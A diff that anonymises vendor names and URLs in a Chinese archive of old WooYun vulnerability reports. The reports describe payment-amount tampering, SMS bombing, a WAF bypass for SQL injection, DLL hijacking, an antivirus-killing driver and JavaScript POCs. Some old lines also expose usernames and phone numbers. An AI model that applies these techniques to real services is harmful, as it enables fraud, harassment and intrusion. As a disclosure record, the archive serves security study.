 **详情**: 海绵宝宝大牛说乌云要开始收二进制漏洞,于是本想下个沙盒bypass一下没想到…file:TailList.syskillk.exekillk看了眼是upx,手脱很简单,找几个脱壳机也分分钟.F8 单步 --> 下断 F9 --> 进入循环 下断 --> F8jmp入点口 --> dump发现写了一个sys出来,早知道监控下文件就好了 Orz..分析sys吧,简单发一下过程.::00010BC0::  68 B00A0100              PUSH 10AB0                          // 驱动入口::00010BC5::  E8 4A050000              CALL 00011114::00010BCA::  83C4 08                  ADD ESP,8::00010BCD::  8B45 08         
 
-**POC**: 写了个小软件配合sys成功kill掉360.给出demohttp://pan.baidu.com/s/1bntn0vX  6wed解压密码：wooyun
+**POC**: 写了个小软件配合sys成功kill掉360.给出demohttps://example.com/[已脱敏]  6wed解压密码：wooyun
 
 **绕过**: 直接利用
 
@@ -20509,8 +20509,8 @@
 ---
 
 ---
-### [wooyun-2014-062101] 中国联通某系统逻辑错误可找回员工用户密码
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-062101] 某运营商某系统逻辑错误可找回员工用户密码
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -20521,9 +20521,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国联通网上学院找回密码处存在逻辑漏洞，导致可以找回部分用户的密码——选择找回密码，用回答问题的方式找回，然后，在答案处输入“123456”即可找回密码。所以，说大多数是因为所选择的账户必须在之前登陆过该网站并留下密码找回问题方可利用该漏洞。网址：http://campus.chinaunicom.cn/ilearn/en/learner/jsp/login.jsp
+**详情**: 某运营商网上学院找回密码处存在逻辑漏洞，导致可以找回部分用户的密码——选择找回密码，用回答问题的方式找回，然后，在答案处输入“123456”即可找回密码。所以，说大多数是因为所选择的账户必须在之前登陆过该网站并留下密码找回问题方可利用该漏洞。网址：https://example.com/[已脱敏]
 
-**POC**: 找测试用户的话可以谷歌"@chinaunicom.cn"。这里留两份用户姓名与网站账号的对应表：http://www.sdta.gov.cn/zhengwunews1/new/edit/UploadFile/2011891661424.dochttp://www.chinaunicom.com.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1344243613195.doc好了，上图了：所需要填的东西的寻找方法已给出。还会轻度泄露隐私哦......
+**POC**: 找测试用户的话可以谷歌"@chinaunicom.cn"。这里留两份用户姓名与网站账号的对应表：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20531,8 +20531,8 @@
 ---
 
 ---
-### [wooyun-2011-03100] 阿里云浏览器远程跨域漏洞
-**厂商**: 阿里巴巴 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-03100] 某电商平台浏览器远程跨域漏洞
+**厂商**: 某电商平台 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -20545,7 +20545,7 @@
 
 **详情**: 阿云浏览器对通过external接口实现浏览器功能的扩展，但是没有考虑接口的安全性。可通过Internet域访问external接口，并进行扩展功能的操作
 
-**POC**: 在任意网站中嵌入<script>try{window.external.DeleteHistoryItem("http://www.baidu.com/");window.external.QueryHistoryList(16);}catch(e){alert("error");}</script>可直接删除历史记录中的baidu条目<script>function OnTest(str){alert(str);}var ext = window.external;try{ext.SetCallback_OnQueryHistoryList(OnTest);ext.QueryHistoryL
+**POC**: 在任意网站中嵌入<script>try{window.external.DeleteHistoryItem("https://example.com/[已脱敏]");window.external.QueryHistoryList(16);}catch(e){alert("error");}</script>可直接删除历史记录中的baidu条目<script>function OnTest(str){alert(str);}var ext = window.external;try{ext.SetCallback_OnQueryHistoryList(OnTest);ext.QueryHistoryL
 
 **绕过**: 直接利用
 
@@ -20567,7 +20567,7 @@
 
 **详情**: 当时360安全卫士默认安装路径为C:\Program Files\360\360Safe\测试时发现360主程序360Safe.exe和360其他程序都存在加载一处不存在的DLL文件，该名称为i18n.dll但这处不存在的DLL存在360的360Safe目录下，由于360默认开启自我保护文件是无法写入的（除非关闭自我保护，再写入。我这里不需要用到这处路径劫持）。我们在这里发现360安全卫士木马防火墙模块360Tray.exe还会加载程序安装目录外的不存的DLL文件。（从而无视360的自我保护）经尝试发现在系统这路径下“C:\Program Files\”写入一个名称为i18n.dll的DLL文件，在运行运行360Tray.exe时会自动加载i18n.dll最终发现在“C:\Program Files\”写入i18n.dll文件后，在360卫士每次开机时（也就是说防火墙每次开启时）都会自动加
 
-**POC**: 来个视频吧http://pan.baidu.com/share/link?shareid=1668261710&uk=4164057933
+**POC**: 来个视频吧https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20575,8 +20575,8 @@
 ---
 
 ---
-### [wooyun-2012-04834] QQ三国BUG、可瞬间点亮图标游戏人物达80级
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-04834] 某互联网公司三国BUG、可瞬间点亮图标游戏人物达80级
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -20587,7 +20587,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ三国有俩个区是体验服 ， 桃园结义是一个体验区有任务让你体验80级 ， 做任务体验80级JN装备的。 在进去之后做等级改变之后结束QQ三国程序， 这样游戏人生就只记录了你的80级，之后你就最好别上这个角色了， 你就算上 也是原先的4级了最后等等级变成80级时侯 结束掉 QQSG.exe 程序。立即图标就会点亮，并且明天就可以直接等着游戏人生更新你的80级荣誉事件了*!关闭程序 用任务管理器关闭!
+**详情**: 某互联网公司三国有俩个区是体验服 ， 桃园结义是一个体验区有任务让你体验80级 ， 做任务体验80级JN装备的。 在进去之后做等级改变之后结束某互联网公司三国程序， 这样游戏人生就只记录了你的80级，之后你就最好别上这个角色了， 你就算上 也是原先的4级了最后等等级变成80级时侯 结束掉 某互联网公司SG.exe 程序。立即图标就会点亮，并且明天就可以直接等着游戏人生更新你的80级荣誉事件了*!关闭程序 用任务管理器关闭!
 
 **POC**: (见原文)
 
@@ -20609,7 +20609,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发现55bbs换了新邮箱系统http://mail.new.55bbs.com/
+**详情**: 发现55bbs换了新邮箱系统https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20631,7 +20631,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随便选个商品，然后一步两步三四步进入提交付款页面点击进入支付时抓包（貌似只能招商网银支付，选支付宝也提示用招行付款），修改金额为1.00OK，进入招行支付页面，付款金额成了1.00元
+**详情**: 随便选个商品，然后一步两步三四步进入提交付款页面点击进入支付时抓包（貌似只能招商网银支付，选某电商平台也提示用招行付款），修改金额为1.00OK，进入招行支付页面，付款金额成了1.00元
 
 **POC**: (见原文)
 
@@ -20653,7 +20653,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tuan.szonline.net/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20697,18 +20697,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.seekfilm.com.cn兑换中心有个礼物，就是你：玛丽莲梦露纪念钟。。45点，这个贵，可是我才有23点+10点（支付漏洞中添加的），肿么办呢？！难道利用之前的洞洞，作为一个奋斗在白帽子路上的少年，一个洞怎么可以钻两次呢。。。。。这时候购买提示，由于点数不够所以提示密码错误：注意到商品id是35，换个姿势，找个便宜的，再修改id不就行了么？！我太机智了提交fiddler截获请求，然后修改为梦露的id
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 然后查看我的订单，果然是梦露啊！：再看看我的卡的剩余点数：
 
 **绕过**: 直接利用
 
-**修复**: 这个地址是坐等礼物的地址！！真的是友情检测，你可以不发货，不给礼物，但是不能查水表！！我原来卡上就23点，给我恢复就好，是我的谁都拿不走！！！累了，你们的网站漏洞太多，最好大修。。修改方式，参照大神的总结，里面有很多支付漏洞的典型案例，也有修复方式：http://zone.wooyun.org/co
+**修复**: 这个地址是坐等礼物的地址！！真的是友情检测，你可以不发货，不给礼物，但是不能查水表！！我原来卡上就23点，给我恢复就好，是我的谁都拿不走！！！累了，你们的网站漏洞太多，最好大修。。修改方式，参照大神的总结，里面有很多支付漏洞的典型案例，也有修复方式：https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2014-053277] 利用百度活动中接验证码的漏洞可制成短信轰炸
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-053277] 利用某搜索引擎活动中接验证码的漏洞可制成短信轰炸
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -20719,7 +20719,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tieba.baidu.com/game/browse/drawIndex?qq-pf-to=pcqq.discussion首先我们进入这个网站随便登一个百度账号然后点获取验证码 之后我们抓包一下!获得如下一串代码http://tieba.lecai.com/user/ajax_phone_authcode_send.php?mobile=150********1利用这段代码我们可以持续get 一直get 也可以挂上网页定时自动刷新.他就会一直无限的去发送!而后面的mobile=是可以随便修改的要发送的手机号码
+**详情**: https://example.com/[已脱敏] 之后我们抓包一下!获得如下一串代码https://example.com/[已脱敏] 一直get 也可以挂上网页定时自动刷新.他就会一直无限的去发送!而后面的mobile=是可以随便修改的要发送的手机号码
 
 **POC**: (见原文)
 
@@ -20743,7 +20743,7 @@
 
 **详情**: 字符信息没有加合法性校验（签名），导致订单金额提交到网银时被篡改。
 
-**POC**: http://www.lvmama.com/super/view/view.do 支付页面直接修改参数然后直接跳到交通银行网银了，没有测试能否返回成功支付，如果不能那就忽略吧。
+**POC**: https://example.com/[已脱敏] 支付页面直接修改参数然后直接跳到交通银行网银了，没有测试能否返回成功支付，如果不能那就忽略吧。
 
 **绕过**: 直接利用
 
@@ -20785,7 +20785,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 航天信息股份有限公司某系统弱口令，用户名同密码相同http://jdkf.aisino.com/9	liuwei	200	false	false	352942	lili	200	false	false	3529180	chenying	200	false	false	3529144	liubo	200	false	false	3529260	yanglin	200	false	false	3529388	wangkun	200	false	false	3529
+**详情**: 航天信息股份有限公司某系统弱口令，用户名同密码相同https://example.com/[已脱敏]	liuwei	200	false	false	352942	lili	200	false	false	3529180	chenying	200	false	false	3529144	liubo	200	false	false	3529260	yanglin	200	false	false	3529388	wangkun	200	false	false	3529
 
 **POC**: (见原文)
 
@@ -20853,7 +20853,7 @@
 
 **详情**: 点点网的标签小编申请存在逻辑漏洞。审核小编的人应该只审核申请理由而没有去该博客阅读该标签的文章的质量。
 
-**POC**: 这是我们一开始看到的审核标签的拒绝理由。在你的点点网博客点击批量编辑，如下图通过批量编辑给你的每篇文章加上该标签，增加标签在你的博客的密度以及热度。下面为增加成功的截图然后去申请该标签小编，通过系统审核，进入到点点网管理员审核阶段。为了防止该标签的现有小编和点点其他用户发现你的行为，再次回到批量编辑里，把刚加上的标签删除。-----------------可以看到 http://www.diandian.com/tag/域名这里的点点网域名小编就是我之前实验时申请到的。
+**POC**: 这是我们一开始看到的审核标签的拒绝理由。在你的点点网博客点击批量编辑，如下图通过批量编辑给你的每篇文章加上该标签，增加标签在你的博客的密度以及热度。下面为增加成功的截图然后去申请该标签小编，通过系统审核，进入到点点网管理员审核阶段。为了防止该标签的现有小编和点点其他用户发现你的行为，再次回到批量编辑里，把刚加上的标签删除。-----------------可以看到 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20883,8 +20883,8 @@
 ---
 
 ---
-### [wooyun-2015-092893] 百度云加速防御规则绕过
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-092893] 某搜索引擎云加速防御规则绕过
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -20895,9 +20895,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 百度云加速防御规则绕过这个漏洞发了一条http://www.smartcome.com/forum.php?mod=viewthread&tid=1%20union%20select%201%20from/*123*/dual--%201现在已经被修复了。不过修复的有问题，只要在另外的位置加上一个/*111*/就可以绕过了。
+**详情**: WooYun: 某搜索引擎云加速防御规则绕过这个漏洞发了一条https://example.com/[已脱敏]
 
-**POC**: 修改一下原来的：http://www.smartcome.com/forum.php?mod=viewthread&tid=1/*111*/union%20select%201%20from/*123*/dual--%201
+**POC**: 修改一下原来的：https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -20917,7 +20917,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海洋码头存在严重漏洞，可低价购买商品，价格随你更改。http://www.ymatou.com/下个299的订单点击付款，抓包拦截；将金额改成0.01，发送请求包，查看结果：订单已经生成啦，金额就是0.01，看起来有点小激动，试下，能否付款成功：付款成功啦，看看我的订单吧点击查看订单详情：幸好我的收货地址信息是乱写的，卖家应该不会给我发货吧。。。。
+**详情**: 上海洋码头存在严重漏洞，可低价购买商品，价格随你更改。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20939,7 +20939,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、 打开此网页2、 然后在地址栏随便输入一个地址，最好是难以到达或者是不能打开（例如端口号不能打开）的，例如https://www.baidu.com，http://www.google.com:303、 onbeforeunload 和onmousemove综合作用可以导致页面写入内容，此时页面显示“加载状态”4、 HTTP 204请求完成，导致页面不显示加载圆圈，此时像是“加载完毕”5、 页面维持这个状态很长时间,定期重发请求会让页面一直显示这个
+**详情**: 1、 打开此网页2、 然后在地址栏随便输入一个地址，最好是难以到达或者是不能打开（例如端口号不能打开）的，例如https://example.com/[已脱敏] onbeforeunload 和onmousemove综合作用可以导致页面写入内容，此时页面显示“加载状态”4、 HTTP 204请求完成，导致页面不显示加载圆圈，此时像是“加载完毕”5、 页面维持这个状态很长时间,定期重发请求会让页面一直显示这个
 
 **POC**: <h1 id="msg">please type www.google.com:100 in the address bar to leave this page</h1><h1 id="spoof"></h1><script type="text/javascript">spoof.style.display = 'none';var done = 0;var got = 0;onbeforeunload = function(ev) {done = 1;return false;}onmousemove = function() {stop();if (done && !got) {msg
 
@@ -20961,7 +20961,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我菜鸟一个，今天无意间看到国美商城搞的半价活动的广告才有幸进入国美商城。活动确实给力，但是额来的有点晚活动已经结束…… 闲逛中偶然发现这个漏洞。下面说下漏洞测试过程：选择商品：我分别选了一个26元和一个27元的U盘。然后我吧26这个U盘数量改成了 “-1” 结果商品总金额变成了1元。如图接下我选择了，在线支付，通过支付宝付款1元。然后奇迹就出现了。PS:我看其他道友的有显示名字，我怎么没到注册账号的地方呢？
+**详情**: 我菜鸟一个，今天无意间看到国美商城搞的半价活动的广告才有幸进入国美商城。活动确实给力，但是额来的有点晚活动已经结束…… 闲逛中偶然发现这个漏洞。下面说下漏洞测试过程：选择商品：我分别选了一个26元和一个27元的U盘。然后我吧26这个U盘数量改成了 “-1” 结果商品总金额变成了1元。如图接下我选择了，在线支付，通过某电商平台付款1元。然后奇迹就出现了。PS:我看其他道友的有显示名字，我怎么没到注册账号的地方呢？
 
 **POC**: 看来人工审核也是摆设。订单顺利通过审核已经进入了拣货阶段。2012-05-23 23:21:06您的订单正在拣货中。我疑惑的是，若是真发货了，这个价格为26数量为-1的U盘订单，他怎么办? 难道还要问我要个U盘回去？！订单在拣货中了……我已联系客服取消了订单。
 
@@ -21007,7 +21007,7 @@
 
 **详情**: 360浏览器高危漏洞，点击原页面打开攻击页面后可修改原页面，可应用于钓鱼，
 
-**POC**: 在百度搜索 www.baidu.com.hackworry.com:8000点击进入后，原百度搜索页面被修改
+**POC**: 在某搜索引擎搜索 www.baidu.com.hackworry.com:8000点击进入后，原某搜索引擎搜索页面被修改
 
 **绕过**: 直接利用
 
@@ -21049,7 +21049,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 书接上回，话说从前有个PPTV。。好吧正经点，PPTV的主站是有抓包限制的，然后又说到想这种大站一般都有很多子站点和很多登陆地址的，这个不行那我们就换其他的，第二发和第三发还比较容易，第四发好难额。。不过还是被我找到了那么一个登陆地址：http://user.g.pptv.com/login/cms/?gid=dgwm，可以看到这个登陆地址也是只有一个单纯的登陆框，但是这次和前两单纯的绕过抓包限制不同了，这次的有个验证码，尼玛难度一下提升了有木有！但是没办法，为了我伟大的第四发，还是要想办法绕过额先抓包看下，可以看到用户名和密码全部明文传输，而且验证码的包是可以抓到的（有戏，嘿嘿）然后试试可不可以绕过吧，我先go一下，看到提示用户名或者密码错误然后换个错误的验证码go一下，看到还是提示用户名或者密码错误，尼玛出乎意料有木有？！验证码形同虚设，直接无视。。爆破去咯~出了不少随便选几个去主站登
+**详情**: 书接上回，话说从前有个PPTV。。好吧正经点，PPTV的主站是有抓包限制的，然后又说到想这种大站一般都有很多子站点和很多登陆地址的，这个不行那我们就换其他的，第二发和第三发还比较容易，第四发好难额。。不过还是被我找到了那么一个登陆地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -21093,7 +21093,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.dagexing.com/正常的在首页一键订房。在订单结算处抓包。把价格处全修改为0.01成功修改金额。支付成功
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 手机收到成功的短信
 
@@ -21103,8 +21103,8 @@
 ---
 
 ---
-### [wooyun-2013-037006] QQ影音M处DLL劫持
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-037006] 某互联网公司影音M处DLL劫持
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -21115,7 +21115,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试时默认的安装路径C:\Program Files\Tencent\QQPlayerQQPlayer.exe运行时会加载多处不存在的DLL文件（包括播放不一样格式的视频文件，加载不存在的DLL也不一样的）直接打开QQPlayer.exe会加载如下不存在的DLLC:\Program Files\Tencent\QQPlayer\qqplayerchs.dllC:\Program Files\Tencent\QQPlayer\qqplayercht.dllC:\Program Files\Tencent\QQPlayer\qqplayerloc.dllC:\Program Files\Tencent\QQPlayer\mpadecfilterchs.dllC:\Program Files\Tencent\QQPlayer\mpadecfiltercht.dllC:\Program Files
+**详情**: 测试时默认的安装路径C:\Program Files\Tencent\某互联网公司Player某互联网公司Player.exe运行时会加载多处不存在的DLL文件（包括播放不一样格式的视频文件，加载不存在的DLL也不一样的）直接打开某互联网公司Player.exe会加载如下不存在的DLLC:\Program Files\Tencent\某互联网公司Player\某互联网公司playerchs.dllC:\Program Files\Tencent\某互联网公司Player\某互联网公司playercht.dllC:\Program Files\Tencent\某互联网公司Player\某互联网公司playerloc.dllC:\Program Files\Tencent\某互联网公司Player\mpadecfilterchs.dllC:\Program Files\Tencent\某互联网公司Player\mpadecfiltercht.dllC:\Program Files
 
 **POC**: (见原文)
 
@@ -21139,7 +21139,7 @@
 
 **详情**: 一数万旅客信息泄露，机票所有信息（身份证——电话——住址——航程——航班）可用于机票诈骗二任意操作他人机票订单，退票，三可以不要钱大量买机票，并且可以出票（屌丝的福利）四短信轰炸(可以任意发送短信）五黑屏功能好像很强大，航空公司内部查询系统，可看某重要领导行踪（放心 我啥都没做 就进来看了几眼）mask 区域1.http://**.**.**/asms/index.jsp账号801 密码123abc  系统太大 研究了好久。。。一，二，三，四， 机票—机票订单管理——查询，可以看到出票了吧 ，这应该出的真票，几千一张啊 ，我可不敢乱动点订票员可以看到订单吧  什么信息都有吧  ，在看订单下面 可发短信，退票，什么行程单什么的吧 ，退票的吧，有图为证。
 
-**POC**: 右上角的黑屏好像很强大 航空公司内部系统？不过不会用参见百度文库http://wenku.baidu.com/link?url=pOsRVJr6BTFsPWkdshAQ3-SR0zekg6G6-kSWBa1avmENCKempc9dj3R4V4CXzV4znhCp8Bb7mh1xfqlC_ZYcr2pgYO2OgOEFDJb9a1XxIY_女神天天打飞机 真有钱。。。。
+**POC**: 右上角的黑屏好像很强大 航空公司内部系统？不过不会用参见某搜索引擎文库https://example.com/[已脱敏] 真有钱。。。。
 
 **绕过**: 直接利用
 
@@ -21247,7 +21247,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、app下载地址：http://www.tuyou.com/2、app详情：apk  : com.tuyou.travel, 250, 2.5.0, 途友apkmd5: ab7111b422881b312932ac8d042dfb5f证书 :certmd5: 29ea2e27f7d992ba1852a6e180df2937issuer: CN=tuyousubject: CN=tuyou
+**详情**: 1、app下载地址：https://example.com/[已脱敏]  : com.tuyou.travel, 250, 2.5.0, 途友apkmd5: ab7111b422881b312932ac8d042dfb5f证书 :certmd5: 29ea2e27f7d992ba1852a6e180df2937issuer: CN=tuyousubject: CN=tuyou
 
 **POC**: 1、正常使用密码找回功能时输入验证码后服务器返回的数据。{"result":"{\"code\":200,\"value\":\"verifySmsCode\",\"data\":{\"status\":201}}"}2、因为是一个交友的app，所以得到了几个手机号：13104571678,13847005830.3、找回密码：4、随意输入验证码：123456，将服务器返回结果修改后在执行。5、进入密码修改界面：密码修改成功。密码均被修改为test1236、使用修改的密码登录账号。
 
@@ -21293,11 +21293,11 @@
 
 **详情**: 华丽丽的发了个低调的漏洞..........任意刷Q币、各种游戏点卡..........Q币要多少有多少有木有！！！！=============================================在进行充值的时候，支付金额与充值金额可被修改，导致可以用1分钱充到999999块钱。参照[支付漏洞的三种常见类型]中，属于第一种情况详见说明.....
 
-**POC**: 1、到这里，选择一项支付方式，然后输入你想要的金额~http://pay.npcgo.com/Charge/ChargeBox.aspx2、然后下一步，在确定的时候抓包修改，将money改成0.013、下面的差不多就可以不说了然后，刷Q币吧少年！
+**POC**: 1、到这里，选择一项支付方式，然后输入你想要的金额~https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 不直接在数据包中加入需要金额和数量等敏感数值，在数据包中加上随机TOKEN防止数据包内容被篡改(感谢0x334@wooyun提出)支付金额与充值金额的统一！[支付漏洞的三种常见类型]：http://imlonghao.com/post/2012-08-24/%E6%94%AF%E4%BB%98%E6
+**修复**: 不直接在数据包中加入需要金额和数量等敏感数值，在数据包中加上随机TOKEN防止数据包内容被篡改(感谢0x334@wooyun提出)支付金额与充值金额的统一！[支付漏洞的三种常见类型]：https://example.com/[已脱敏]
 ---
 
 ---
@@ -21315,7 +21315,7 @@
 
 **详情**: 如果去代充值，是不是早晚成富二代他爹！
 
-**POC**: 第一次 测试帐号：blackgame------------------------------详细步骤-----------------------------------------选择那个最贵的东西，然后卧槽，想着我要免费获得 我要免费获得！！！然后进入下一步打开拦截工具，然后选择支付宝 付款如图修改金额 0.01 这里我简单带过。可以去看@小威WooYun: 安居客账号支付功能存在漏洞（1分钱成功支付证明）的漏洞比我详细
+**POC**: 第一次 测试帐号：blackgame------------------------------详细步骤-----------------------------------------选择那个最贵的东西，然后卧槽，想着我要免费获得 我要免费获得！！！然后进入下一步打开拦截工具，然后选择某电商平台 付款如图修改金额 0.01 这里我简单带过。可以去看@小威WooYun: 安居客账号支付功能存在漏洞（1分钱成功支付证明）的漏洞比我详细
 
 **绕过**: 直接利用
 
@@ -21335,7 +21335,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 选择东西下单 进入支付页面http://www.leyou.com.cn/purchase/alipay/alipay_to.php?orderId=(serial的值)&amount=0.1进入支付宝的页面忘截了
+**详情**: 选择东西下单 进入支付页面https://example.com/[已脱敏])&amount=0.1进入某电商平台的页面忘截了
 
 **POC**: (见原文)
 
@@ -21345,8 +21345,8 @@
 ---
 
 ---
-### [wooyun-2012-09606] 自行注册用户可绕过柜台受理开通支付宝与财付通的快捷支付
-**厂商**: 支付宝 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-09606] 自行注册用户可绕过柜台受理开通某电商平台与财付通的快捷支付
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -21389,8 +21389,8 @@
 ---
 
 ---
-### [wooyun-2015-0115947] 淘宝客户端某漏洞导致可以大规模钓鱼获取淘宝账号
-**厂商**: 淘宝网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0115947] 某电商平台客户端某漏洞导致可以大规模钓鱼获取某电商平台账号
+**厂商**: 某电商平台网 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -21401,7 +21401,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 昨晚睡不着，躺床上玩手机的时候研究了一下IOS移动端的伪协议发现淘宝客户端存在一些问题基础协议是：taobao://由于淘宝客户端的设计，导致可以在后面加URL打开任意网站但是APP做了正则匹配，对于不在白名单中的URL，会跳出提示例如：taobao://wooyun.org俗话说得好，有正则的地方必有绕过一番尝试，发现确实可以绕过这个限制taobao://**-taobao.com只要是这种格式的域名并且“**”为某个域名后缀就可以，“**”为其他英文字符的则无法绕过限制可以绕过的比如taobao://me-taobao.comtaobao://com-taobao.comtaobao://cn-taobao.com前两个已经有人在用了于是我注册了org-taobao.com=========================================================
+**详情**: 昨晚睡不着，躺床上玩手机的时候研究了一下IOS移动端的伪协议发现某电商平台客户端存在一些问题基础协议是：taobao://由于某电商平台客户端的设计，导致可以在后面加URL打开任意网站但是APP做了正则匹配，对于不在白名单中的URL，会跳出提示例如：taobao://wooyun.org俗话说得好，有正则的地方必有绕过一番尝试，发现确实可以绕过这个限制taobao://**-taobao.com只要是这种格式的域名并且“**”为某个域名后缀就可以，“**”为其他英文字符的则无法绕过限制可以绕过的比如taobao://me-taobao.comtaobao://com-taobao.comtaobao://cn-taobao.com前两个已经有人在用了于是我注册了org-taobao.com=========================================================
 
 **POC**: (见原文)
 
@@ -21499,8 +21499,8 @@
 ---
 
 ---
-### [wooyun-2014-074908] 新浪某分站手机短信轰炸
-**厂商**: 新浪 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-074908] 某社交平台某分站手机短信轰炸
+**厂商**: 某社交平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -21587,8 +21587,8 @@
 ---
 
 ---
-### [wooyun-2013-047408] 腾讯微信全版本突破视频聊天免打扰功能
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-047408] 某互联网公司某互联网公司全版本突破视频聊天免打扰功能
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -21599,7 +21599,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在微信里面想找人视频聊天首先要让对方回复你一下，才能视频通话，我就非要直接视频聊天。。。。。。。其实很简单分为三部：1、首先直接实时对讲。2、退出实时对讲功能。3、再直接视频聊天，你就发现可以直接视频聊天了，已经突破了防打扰功能。
+**详情**: 在某互联网公司里面想找人视频聊天首先要让对方回复你一下，才能视频通话，我就非要直接视频聊天。。。。。。。其实很简单分为三部：1、首先直接实时对讲。2、退出实时对讲功能。3、再直接视频聊天，你就发现可以直接视频聊天了，已经突破了防打扰功能。
 
 **POC**: (见原文)
 
@@ -21621,7 +21621,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /ajaxpro/Web.buy.order,Web.ashx HTTP/1.1Host: www.diyigaokao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/plain; charset=utf-8X-AjaxPro-Method: SetInfoReferer: http://www.diyigaokao
+**详情**: POST /ajaxpro/Web.buy.order,Web.ashx HTTP/1.1Host: www.diyigaokao.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/plain; charset=utf-8X-AjaxPro-Method: SetInfoReferer: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -21643,9 +21643,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注射点：http://shanghai.koofang.com/rent/UpdateTime.php?id=1000133025短信轰炸处：http://shanghai.koofang.com/login/register.php输入手机 点击发送短信然后抓包 POST封包发送 突破时间60秒限制 无限发送
+**详情**: 注射点：https://example.com/[已脱敏] 点击发送短信然后抓包 POST封包发送 突破时间60秒限制 无限发送
 
-**POC**: 注射点：http://shanghai.koofang.com/rent/UpdateTime.php?id=1000133025短信轰炸处：http://shanghai.koofang.com/login/register.php输入手机 点击发送短信然后抓包 POST封包发送 突破时间60秒限制 无限发送
+**POC**: 注射点：https://example.com/[已脱敏] 点击发送短信然后抓包 POST封包发送 突破时间60秒限制 无限发送
 
 **绕过**: 直接利用
 
@@ -21653,8 +21653,8 @@
 ---
 
 ---
